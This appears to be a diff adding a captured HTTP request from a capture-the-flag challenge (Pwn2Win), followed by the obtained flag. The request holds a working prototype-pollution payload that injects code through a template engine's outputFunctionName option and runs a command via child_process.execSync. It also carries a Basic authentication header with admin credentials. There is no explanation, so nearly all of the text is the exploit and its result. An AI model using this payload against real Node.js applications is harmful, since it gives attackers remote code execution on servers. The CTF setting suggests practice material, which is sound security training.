@@ -1,0 +1,19 @@
+POST /change_status HTTP/1.1
+Host: illusion.pwn2win.party:29865
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46amZodXV6cGRzaWRpeGNkdw==
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Type: application/json
+Content-Length: 139
+
+{"constructor/prototype/outputFunctionName":"x;return process.mainModule.require('child_process').execSync('/readflag').toString()//"}
+
+
+```
+CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
+```
